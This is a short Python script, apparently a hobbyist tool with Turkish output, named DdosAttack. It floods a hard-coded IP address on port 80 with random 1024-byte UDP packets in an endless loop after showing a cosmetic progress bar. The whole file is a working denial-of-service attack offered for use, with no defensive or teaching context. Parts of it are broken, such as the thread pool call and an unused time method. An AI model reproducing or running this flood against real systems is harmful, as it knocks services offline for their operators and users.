import sys
import os
import time
import socket
import random
from datetime import datetime
from multiprocessing.dummy import Pool as ThreadPool

class DdosAttack:
  """Ddos Attack"""
  def __init__(self):
    pass

  def Saat(self):
    now = datetime.now()

    hour = now.hour
    minute = now.minute
    day = now.day
    month = now.month
    year = now.year
  
  def Ddos(self):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)

    os.system("clear")
    os.system("figlet DDos Attack")

    ip    = "192.168.1.41"
    port  = 80
    port = int(port)
    os.system("clear")
    os.system("figlet Ddos Attack")

    print("[                    ] 0% ")
    time.sleep(1)
    print("[=====               ] 25%")
    time.sleep(1)
    print("[==========          ] 50%")
    time.sleep(1)
    print("[===============     ] 75%")
    time.sleep(1)
    print("[====================] 100%")
    time.sleep(1)

    sent = 0

    while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      #port = port + 1
      print("Gönderilen Paket Sayısı: {0} İP: {1} Port:{2}".format(sent,ip,port))
      #if port == 65534:
      #  port = 1

  def run(self):
    pool = ThreadPool(4)
    results = pool.map(self.Ddos())
    pool.close()
    pool.join()

try:
  if __name__ == "__main__":
    t = DdosAttack()
    t.run()
  else:
    pass
except BaseException as e:
  pass

